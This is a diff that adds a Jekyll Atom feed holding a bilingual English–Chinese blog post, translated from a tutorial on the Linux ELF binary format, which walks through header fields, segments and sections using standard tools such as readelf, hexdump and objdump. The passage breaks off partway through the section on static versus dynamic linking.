@@ -1,0 +1,2769 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.3">Jekyll</generator><link href="https://security-onigiri.github.io//feed.xml" rel="self" type="application/atom+xml" /><link href="https://security-onigiri.github.io//" rel="alternate" type="text/html" /><updated>2018-03-11T20:09:47-07:00</updated><id>https://security-onigiri.github.io//</id><entry><title type="html">Linux ELF 二進位檔案入門：搞懂兼分析</title><link href="https://security-onigiri.github.io//2018/03/08/the-101-of-elf-binaries-on-linux-understanding-and-analysis.html" rel="alternate" type="text/html" title="Linux ELF 二進位檔案入門：搞懂兼分析" /><published>2018-03-08T00:00:00-08:00</published><updated>2018-03-08T00:00:00-08:00</updated><id>https://security-onigiri.github.io//2018/03/08/the-101-of-elf-binaries-on-linux-understanding-and-analysis</id><content type="html" xml:base="https://security-onigiri.github.io//2018/03/08/the-101-of-elf-binaries-on-linux-understanding-and-analysis.html">&lt;h1 id=&quot;the-101-of-elf-binaries-on-linux-understanding-and-analysis&quot;&gt;The 101 of ELF Binaries on Linux: Understanding and Analysis&lt;/h1&gt;
+
+&lt;h2 id=&quot;executable-and-linkable-format-可執行檔與可連結格式&quot;&gt;Executable and Linkable Format 可執行檔與可連結格式&lt;/h2&gt;
+
+&lt;p&gt;An extensive dive into ELF files: for security incident response, development, and better understanding&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;廣泛的深入 ELF 檔案: 為了資安事件響應、程式開發與更好的理解&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;We often don’t realize the craftsmanship of others, as we conceive them as normal. One of these things is the usage of common tools, like &lt;em&gt;ps&lt;/em&gt; and &lt;em&gt;ls&lt;/em&gt;.Even though the commands might be perceived as simple, under the hood there is more to it: ELF binaries. Let’s have an introduction into the world of this common file format for Linux and UNIX-based systems.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;我們通常不理解其他的技術，把他們想的跟喝水一樣普通。其一便是一般工具的使用方法，像是 &lt;em&gt;ps&lt;/em&gt; 與 &lt;em&gt;ls&lt;/em&gt;。甚至該指令可能是被認為簡單的，其實還有更多隱藏在 ELF 二進位格式中。讓我們向世界介紹這個在 Linux 與 基於 UNIX 系統上普遍可見的檔案格式。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;strong&gt;Why learn the details of ELF ? 為什麼要了解 ELF 的細節?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Before diving into more technical details, it might be good to explain why understanding of the ELF format is useful. As a starter, it helps to learn the inner workings of our operating system. When somehing goes wrong, we might better understand what happened (or why). Then there is the value in being able to research ELF files, e.g. after a security breach (incident response, malware research, forencis). Last but not least, for a better understanding while developing. Even if you program in a high-level language like Golang, you still might benefit from knowing what happens behind the scenes.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;在更深入到技術細節之前，最好先解釋一下為什麼了解 ELF 格式是有用的，當作開頭，可以幫助學習我們作業系統裡面的運作原理。當某些東西出錯了，我們或許較能知道發生了什麼事情(或是為什麼)。這就是研究 ELF 檔案的價值所在，例如在一波資安攻擊之後(事件響應，惡意軟體研究，鑑識)。最後而同樣重要的是，能在開發時有更好的理解力。甚至當你在使用高級語言如 Golang，你仍可能受益於知曉該場景背後發生了些什麼事情。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;strong&gt;From source to process 從原始碼到行程&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;So whatever operating system we run, it needs to translate common functions to the language of the CPU, also known as machine code. A function could be something basic like opening a file on disk or showing something on the screen. Instead of talking directly to the CPU, we use a programming language, using internal functions. A compiler then translates these functions into object code. This object code is then linked into a full program, by using a linked tool. The result is a binary file, which then can be executed on that specific platform and CPU type.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;所以無論我們運行任何作業系統，它需要將一般功能翻譯成 CPU 的語言，也被稱為機器語言。一個函式可被拆分成基本的指令像是在硬碟上開啟一個檔案或是顯示一些東西在螢幕上。儘管可以直接對 CPU 下達指令，我們使用一種程式語言，使用內部的函式。然後使用編譯器翻譯這些函式成為目的碼(編按: object code)。藉由使用連結工具這個物件碼將被連結成一個完整的程式。結果是一個可以執行在特定平台與 CPU 架構下的二進制檔案。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;strong&gt;Before you start 在開始之前&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;This blog post will share a lot of commands. Don’t run them on production systems. Better do it on a test machine. If you like to test commands, copy an existing binary and use that. Additionally, we have provided a small C program, which can you compile. After all, trying out is the best way to learn and compare results.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;這個部落格文章將分享一堆指令。請勿在正式環境執行。最好是在測試環境上。如果你喜歡測試指令，複製一個已存在的二進制檔並使用他們。此外，我們提共了一個小型的 C 語言程式，你可以自行嘗試編譯。總之，嘗試是最好的學習方式與比對結果。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;not-just-executables-並非只是可執行檔&quot;&gt;Not Just Executables 並非只是可執行檔&lt;/h2&gt;
+
+&lt;p&gt;A common misconception is that ELF files are just for executables. We already have seen they can be used for partial pieces (object code). Another example includes shared libraries, and even core dumps (those core or a.out files). ELF is also used for the kernel and kernel moduels on Linux machines.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;一種常見的誤解是 ELF 檔案只會是可執行檔。我們已經看到他們可以被用來部份利用(object code). 另外一個例子包含 shared libries，而甚至 core dump (core 或 a.out 檔)。在 Linux 機器上 ELF 也被用在核心與核心模組。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;structure-結構&quot;&gt;Structure 結構&lt;/h2&gt;
+
+&lt;p&gt;Due to the extensible design of ELF files, the structure differs per file. An ELF file consists of:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;因為可擴充設計的緣故，每個檔案的結構不同。一個 ELF 檔案的組成有：&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;ELF header (ELF 標頭)&lt;/li&gt;
+  &lt;li&gt;File data (檔案資料)&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;With the &lt;em&gt;readelf&lt;/em&gt; command we can look at the structure of a file and it will look something like this:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;可以使用 &lt;em&gt;readelf&lt;/em&gt; 指令我們可以看到檔案的結構可以看到如下的畫面：&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h4 id=&quot;elf-header--elf-標頭&quot;&gt;ELF header / ELF 標頭&lt;/h4&gt;
+
+&lt;p&gt;As can be seen in this screenshot, the ELF header starts with some magic. While this might look fuzzy at first, it is a partial representation of the header data itself. The first 4 hexdecimal pieces define that this is an ELF file (45=E,4c=L,46=F), prefixed with the 7f value.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;可由截圖看到，ELF 標頭從一些 magic 開始。或許一開始看起來會有點混論，那是一個表示標頭資料的部份。頭四個 16 進制部份定義了這是一個 ELF 檔(45=E,4c=L,46=F)，並由 7f 做為前置標記。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;This ELF header is mandatory and ensures that data is correctly interpreted during linking or execution. To better understand the inner working of an ELF file, it is useful to know the file used. It is actually easier than it looks.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;這個 ELF 標頭是強制的並且可以確保資料正確的在連結或是執行階段被直譯。為了更好的了解 ELF 內部運作，了解使用到的檔案是有幫助的，實際上那比看上去的簡單。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h4 id=&quot;class--類別&quot;&gt;Class / 類別&lt;/h4&gt;
+
+&lt;p&gt;After the ELF type declaration, there is a Class field defined. This value determines if the file is meant for a 32 (=1) or 64 (=2) bit architecture. The magic shows a 2, which is displayed by the readelf command as an ELF64 file. In other words, an ELF file using 64 bit architecture. Not surprising, as this particular machine contains a modern CPU.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;在 ELF 類型宣告之後，有定義一個類別的欄位。這個值決定這個檔案是 32 或是 64 位元架構。magic 顯示一個 2，被 readelf 指令顯示為 ELF64 的檔案。換句話說，一個 ELF 檔案使用 64 位元架構。不意外的，這個特定機器包含一個現代 CPU。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h4 id=&quot;data-資料&quot;&gt;Data 資料&lt;/h4&gt;
+
+&lt;p&gt;Next there is a data field. It knows two options: 01 for LSB (Least Significant Bit), also known as little-endian. The there is the value 02, for MSB (Most Significant Bit, big-endian). This particular value helps to interpret the remaining objects correctly within the file. This is important, as different types of processors deal differently with the incoming instructions and data structures. In this case LSB is used, which is common for AMD64 type processors.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;接下來有一個資料欄位。它有兩個選項： 01 表示 LSB(Least Significant Bit)，也被稱為 little-endian。這個特定值幫助正確的直譯在檔案中剩下的物件。這是非常重要的，不同的處理器使用不同的方式處理接收到的指令與資料結構。這個案例使用 LSB，是普遍 AMD64 處理器的型態。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;The effect of LSB becomes visible when using hexdump on a binary file like /bin/ps.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;當對一個二進位檔如 /bin/ps 使用 hexdump 則效果是顯而易見的。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ hexdump -n 16 /bin/ps
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We can see that the value pairs are different, which is caused by the right interpretation of the byte order.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;我們可以看到一對值是不同的，因為是由右開始解釋的位元組順序。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h4 id=&quot;version-版本&quot;&gt;Version 版本&lt;/h4&gt;
+
+&lt;p&gt;Next in line is another “01” in the magic, which is the version number. Currently, there is only 1 version type: currently, which is the value “01”. So nothing interesting to remember.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;下一個要講的是在 magic 裡面的另外一個 “01”，表示的是版本號。目前只有一種版本類型: 就是 “01” 這個值。所以沒啥有趣的東東好記的。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;osabi-and-abi-version-作業系統應用二進為介面與應用二進為介面版本&quot;&gt;OS/ABI and ABI version 作業系統/應用二進為介面與應用二進為介面版本&lt;/h3&gt;
+
+&lt;p&gt;Each operating system has a big overlap in common functions. In addition, each of them has specific ones, or at least minor differences between them. To ensure the right functions are used, an application binary interface (ABI), is defined. This way the operating system and applications both know what to expect and functions are correctly forwarded. These two fields describe what ABI is used and the related version. For Linux systems this is the SystemV.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;每個作業系統在常見的函式上常有重疊。另外，他們每一個都有一個特例，或是之間存在微小的差異。為了確保使用正確的函式，才定義了一個應用二進位介面 (ABI)。如此一來作業系統與應用程式便可以預期甚麼樣的事情及功能會被傳遞過來。這兩個欄位描述了 ABI 被使用及其相關的版本。對 Linux 系統來說就是 SystemV。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;machine-機器&quot;&gt;Machine 機器&lt;/h3&gt;
+
+&lt;p&gt;In the header we can also find the expected machine type(AMD64)&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;在標頭我們也可以找到預期的機器類型 (AMD64)&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h4 id=&quot;type-型態&quot;&gt;Type 型態&lt;/h4&gt;
+
+&lt;p&gt;The &lt;strong&gt;type&lt;/strong&gt; field tells us what the purpose of the file is.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;類型欄位這個檔案的用途為何&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Usually it is:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;它通常是:&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;DYN(Shared object file), for libraries&lt;/li&gt;
+  &lt;li&gt;EXEC (Executable file), for binaries&lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;REL(Relocatable file), before linked into an executable file&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;DYN (共享物件檔)，函式庫&lt;/li&gt;
+  &lt;li&gt;EXEC (可執行檔)，二進位檔案&lt;/li&gt;
+  &lt;li&gt;REL (可重定位檔)，連結進一個執行檔前的檔案&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id=&quot;machine--機器&quot;&gt;Machine / 機器&lt;/h4&gt;
+
+&lt;p&gt;While some of the fields could already be displayed via the magic value of the readelf output, there is more. For example for waht specific processor type the file is. Using hexdump we can see the real values.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;某些欄位可以透過 readelf 輸出顯示其魔術值，但其實還有更多。舉例來說: 該檔案的指定處理器類型是哪一個。使用 hexdump 我們可以看到真實的資料。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;blockquote&gt;
+    &lt;table&gt;
+      &lt;tbody&gt;
+        &lt;tr&gt;
+          &lt;td&gt;7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00&lt;/td&gt;
+          &lt;td&gt;.ELF…………&lt;/td&gt;
+        &lt;/tr&gt;
+        &lt;tr&gt;
+          &lt;td&gt;02 00 &lt;strong&gt;3e&lt;/strong&gt; 00 01 00 00 00 a8 2b 40 00 00 00 00 00&lt;/td&gt;
+          &lt;td&gt;..&amp;gt;……+@…..&lt;/td&gt;
+        &lt;/tr&gt;
+        &lt;tr&gt;
+          &lt;td&gt;40 00 00 00 00 00 00 00 30 65 01 00 00 00 00 00&lt;/td&gt;
+          &lt;td&gt;@…….0e……&lt;/td&gt;
+        &lt;/tr&gt;
+        &lt;tr&gt;
+          &lt;td&gt;00 00 00 00 40 00 38 00 09 00 40 00 1c 00 1b 00&lt;/td&gt;
+          &lt;td&gt;….@.8…@…..&lt;/td&gt;
+        &lt;/tr&gt;
+      &lt;/tbody&gt;
+    &lt;/table&gt;
+  &lt;/blockquote&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;em&gt;(Output created with hexdump -C -n 64 /bin/ps)&lt;/em&gt;
+&lt;em&gt;(透過 hexdump -C -n 64 /bin/ps 製造的輸出)&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;The highlighted field above is what defines the machine type. The value 3e is 62 in decimal, which equals to AMD64. To get an idea of all machine types, have a look at this &lt;em&gt;ELF header file&lt;/em&gt;.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;上面粗體的欄位就是定義了機器類型。3e 就是十進位的 62，表示的是 AMD64。若想知道更多機器類型，瞧一瞧這個吧&lt;a href=&quot;http://www.opensource.apple.com/source/dtrace/dtrace-90/sys/elf.h&quot;&gt;ELF header file&lt;/a&gt;。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;With all these fields clarified, it is time to look at where the real magic happens and move into the next headers!&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;透過這幾個欄位的闡述，該是時候看看真正魔法並進到後面的標頭了!&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h4 id=&quot;file-data--檔案資料&quot;&gt;File data / 檔案資料&lt;/h4&gt;
+
+&lt;p&gt;Besides the ELF header, ELF files consist of:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;除了 ELF 標頭之外，ELF 檔案的組成為:&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Program Headers or Segments(9) (程式標頭 或 區段)&lt;/li&gt;
+  &lt;li&gt;Section Headers or Sections(28) (節區標頭 或 節區)&lt;/li&gt;
+  &lt;li&gt;Data (資料)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Before we dive into these headers, it is good to know that ELF has two complementary “views”. One for used for the linker to allow execution (segments), one for categorizing instructins and data (sections). So depending on the goal, the related header types are used. Let’s start with program headers, which we find on ELF binaries.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;在我們深入這些標頭之前，了解到 ELF 有兩個互補的”視圖”是再好不過了。一個是為了可以讓連結器執行 (區段)，一個用來分類指令(編按: 原文typo，應為 instruction)與資料 (節區)，基於這個目標，相關的標頭類型將被使用到。讓我們從 ELF 二進位檔中找到的程式標頭們開始吧。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;program-headers--程式標頭&quot;&gt;Program headers / 程式標頭&lt;/h3&gt;
+
+&lt;p&gt;An ELF file consists of zero or more segments, and describe how to create a process/memory image for runtime execution. When the kernel sees these segments, it uses them to map them into virtual address space, using the mmap(2) system call. In other words, it converts predefined instructions into a memory image. If your ELF file is a normal binary, it requires these program headrs, otherwise it won’t run. And it uses these headers, with the underlying data structure, to form a process. This process is similar for shared libraries.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;一個 ELF 檔案由至少零個區段組成，並且描述如何創造一個執行時期的行程/記憶體映像。當核心看到這些區段，它使用系統呼叫 mmap(2) 將他們映射到虛擬位址空間，換句話來說，它轉換預先定義的指令到記憶體映像中。如果你的 ELF 檔案是一個普通的二進位檔，它將需求這些程式標頭，否則無法運行。並且它使用這些標頭，與底層資料結構來形成一個程序。這個程序與共享函式庫類似。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://assets.linux-audit.com/wp-content/uploads/2015/08/elf-program-headers-segments.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;An overview of program heders in an ELF binary&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;一個 ELF 二進位檔中的程式標頭概觀&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;We see in this example that there are 9 program headers. When looking at it for the first time, it hard to understand what happens here. So let’s go into a few details.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;我們看到這個範例有 9 個程式標頭。當第一次看到的時候，它(編按: 原文應該少了 is)讓人難以理解這在搞啥。所以讓我進入到一點細節部分。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;strong&gt;GNU_EH_FRAME&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;This is a sorted queue, used by the GNU C (gcc), to store exeception handlers. So when something goes wrong, it can use this part to deal correctly with it.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;被 GNU C (gcc) 所使用的是一個排序過的佇列，來存放意外處理器。所以當某東西出錯了，它可以使用這個部分來處理修正錯誤。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;strong&gt;GNU_STACK&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;This header is used to sotre stack information. The stack is a buffer, or scratch place, where items are stored, like local variables. This will occur with LIFO(Last In, First Out), similar to putting boxes on top of each other. When a process function is started a block is reserved. When the funtion is finished, it will be marked as free again. Now the interesting part is that a stack shouldn’t be executable, as this might introduce security vulnerabilities. By manipulation of memory, one could refer to this executable stack and run intended instructions.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;這個標頭被用來存放堆疊資訊。堆疊是一個緩衝區，或是一個存放龐雜物品的地方，像是區域變數。這裡的運作是 LIFO(後進先出)，類似於把一個盒子放置於其他盒子之上。當一個程序函式開始執行，就會有一個區塊被保留。當函式結束該區塊將再次被標記為自由。如今有趣的部分是，堆疊不該為可執行，當作是介紹安全弱點。透過操作記憶體，其他地方可能參考到這個可執行的堆疊並故意運行一些指令。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;If the GNU_STACK segment is not available, then usasally an executable stack is used. The scanelf and execstack tools are two examples to show the stack details.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;如果 GNU_STACK 區段並非可用的，則通常可執行的堆疊會被使用。 &lt;code class=&quot;highlighter-rouge&quot;&gt;scanelf&lt;/code&gt; 與 &lt;code class=&quot;highlighter-rouge&quot;&gt;execstack&lt;/code&gt; 是兩個可以呈現堆疊詳細資訊的工具。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# scanelf -e /bin/ps&lt;/span&gt;
+ TYPE   STK/REL/PTL FILE 
+ET_EXEC RW- R-- RW- /bin/ps
+
+&lt;span class=&quot;c&quot;&gt;# execstack -q /bin/ps&lt;/span&gt;
+- /bin/ps
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;em&gt;Commands to see program headers&lt;/em&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;em&gt;可以看程式標頭的指令&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;dumpelf (pax-utils)&lt;/li&gt;
+  &lt;li&gt;elfls -S /bin/ps&lt;/li&gt;
+  &lt;li&gt;eu-readelf -program-headers /bin/ps&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;sections--節區&quot;&gt;Sections / 節區&lt;/h3&gt;
+
+&lt;h4 id=&quot;section-headers--節區標頭&quot;&gt;Section headers / 節區標頭&lt;/h4&gt;
+
+&lt;p&gt;The section headres define all the sections in the file. As said, this “view” is used for linking and relocation.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;節區標頭定義了在檔案中的所有節區。就像前面提到的，這個”視圖”視被用來連結與重定位的。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Sections can be found in an ELF binary after the GNU C compiler transformed C code into assembly, followed by the GNU assembler, which creates objects of it.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;節區可以在 GNU C 編譯器將 C 程式碼轉換成組合語言且被後面的 GNU 組譯器，在 ELF 二進位檔中發現，&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;As the image above shows, a segment can have 0 or more sections. For executable files there are four main sections: &lt;strong&gt;.text&lt;/strong&gt;, &lt;strong&gt;.data&lt;/strong&gt;, &lt;strong&gt;.rodata&lt;/strong&gt;, and &lt;strong&gt;.bss&lt;/strong&gt;. Each of these sections are loaded with different access rights, which can be seen with &lt;strong&gt;readelf -S&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;如上面的圖所示，一個區段可以擁有 0 或更多個節區。以可執行檔來說有主要四個節區: &lt;strong&gt;.text&lt;/strong&gt;、&lt;strong&gt;.data&lt;/strong&gt;、&lt;strong&gt;.rodata&lt;/strong&gt;與 &lt;strong&gt;.bss&lt;/strong&gt;。這每一個節區都被載入且擁有不同的存取權限，可以用 &lt;strong&gt;readelf -S&lt;/strong&gt; 來查看。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h4 id=&quot;text--程式碼區段&quot;&gt;.text / 程式碼區段&lt;/h4&gt;
+
+&lt;p&gt;Contains executable code. It will be packed into a segment with read and execute access rights. It is only loaded once, as the contents will not change. This can be seen with the &lt;strong&gt;objdump&lt;/strong&gt; utility.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;包含可執行程式碼。程式碼將被包裝到一個區段中，有可讀可執行的權限並且它只會被載入一次，因為程式碼內容不會改變。可以使用 &lt;strong&gt;objdump&lt;/strong&gt; 工具查看。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;blockquote&gt;
+    &lt;p&gt;12 &lt;strong&gt;.text&lt;/strong&gt; 0000a3e9 0000000000402120 0000000000402120 00002120 2&lt;strong&gt;4&lt;br /&gt;
+CONTENTS, ALLOC, LOAD, **READONLY&lt;/strong&gt;, &lt;strong&gt;CODE&lt;/strong&gt;&lt;/p&gt;
+  &lt;/blockquote&gt;
+&lt;/blockquote&gt;
+
+&lt;h4 id=&quot;data--資料區段&quot;&gt;.data / 資料區段&lt;/h4&gt;
+
+&lt;p&gt;Initialized data, with read/write access rights.&lt;/p&gt;
+
+&lt;p&gt;初始化後的資料，有可讀可寫的權限。&lt;/p&gt;
+
+&lt;h4 id=&quot;rodata--唯讀資料區段&quot;&gt;.rodata / 唯讀資料區段&lt;/h4&gt;
+
+&lt;p&gt;Initialized data, with read access rights only (=A).&lt;/p&gt;
+
+&lt;p&gt;初始化後的資料，只有可讀的權限。&lt;/p&gt;
+
+&lt;h4 id=&quot;bss--位初始化資料區段&quot;&gt;.bss / 位初始化資料區段&lt;/h4&gt;
+
+&lt;p&gt;Uninitialized data, with read/write access rights (=WA)&lt;/p&gt;
+
+&lt;p&gt;未初始化的資料，有可讀可寫的權限&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;blockquote&gt;
+    &lt;p&gt;[24] .data PROGBITS 00000000006172e0 000172e0&lt;br /&gt;
+0000000000000100 0000000000000000 &lt;strong&gt;WA&lt;/strong&gt; 0 0 8&lt;br /&gt;
+[25] .bss NOBITS 00000000006173e0 000173e0&lt;br /&gt;
+0000000000021110 0000000000000000 &lt;strong&gt;WA&lt;/strong&gt; 0 0 32&lt;/p&gt;
+  &lt;/blockquote&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;em&gt;Commands to see section and headers&lt;/em&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;em&gt;用來看節區與標頭的指令&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;dumpelf&lt;/li&gt;
+  &lt;li&gt;elfls -p /bin/ps&lt;/li&gt;
+  &lt;li&gt;eu-readelf -section-headers /bin/ps&lt;/li&gt;
+  &lt;li&gt;rreadelf -S /bin/ps&lt;/li&gt;
+  &lt;li&gt;objudmp -h /bin/ps&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id=&quot;section-groups--節區群組&quot;&gt;Section groups / 節區群組&lt;/h4&gt;
+
+&lt;p&gt;Some sections can be grouped, as they form a whole, or in other words be a dependency. Newer linkers support this functionality. Still this is not common to find that often:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;某一些節區可以被群組起來成為一個整體，換句話說成為從屬關係，新一點的連結器才有支援這個功能。這仍然不是這麼常見:&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;blockquote&gt;
+    &lt;p&gt;# readelf -g /bin/ps&lt;/p&gt;
+
+    &lt;p&gt;There are no section groups in this file.&lt;/p&gt;
+  &lt;/blockquote&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;While this might not be looking very interesting, it shows a clear benefit of reasearching the ELF toolkits which are available, for analysis. For this reason, an overview of tools and their primary goal have been included at the end of this article.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;這看起或許並不有趣，可用的 ELF 工具組在研究與分析方面有顯著的益處，基於這個原因，一些工具與他們主要的用途概述將會在文末附上。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;static-vs-dynamic--靜態-vs-動態&quot;&gt;Static VS Dynamic / 靜態 VS 動態&lt;/h3&gt;
+
+&lt;p&gt;Another thing to mention before closing an introduction on the subject of ELF is static and dynamic binaries. For optimization purposes we often see that binaries are “dynamic”, which means it needs external components to run correctly. Often these external components are normal libraries, which contain common functions, like opening files or createing a network socket. Static binaries on the other hand have all libraries included, which make them bigger, yet more portable (e.g. using them on another system).&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;另外一個在結束介紹 ELF 是靜態和動態二進位的主題前要提及的，為了最佳化的目的，我們通常將二進位檔視為”動態”，代表的是它需要額外的部件來正確運行。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;If you want to check if a file is statically or dynamically compiled, use the file command. If it shows something like:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;如果你要確認一個檔案是否為動態或是靜態編譯的，使用 &lt;code class=&quot;highlighter-rouge&quot;&gt;file&lt;/code&gt; 命令。如果它顯示如:&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;blockquote&gt;
+    &lt;p&gt;$ file /bin/ps&lt;br /&gt;
+/bin/ps: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), &lt;strong&gt;dynamically linked (uses shared libs)&lt;/strong&gt;, for GNU/Linux 2.6.24, BuildID[sha1]=2053194ca4ee8754c695f5a7a7cff2fb8fdd297e, stripped&lt;/p&gt;
+  &lt;/blockquote&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;To determine what external libraries are being used, simply use the ldd on the same binary:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;要確認額外函式庫有那些被使用到，簡單的使用 &lt;code class=&quot;highlighter-rouge&quot;&gt;ldd&lt;/code&gt; 在同一個二進位檔上:&lt;/p&gt;
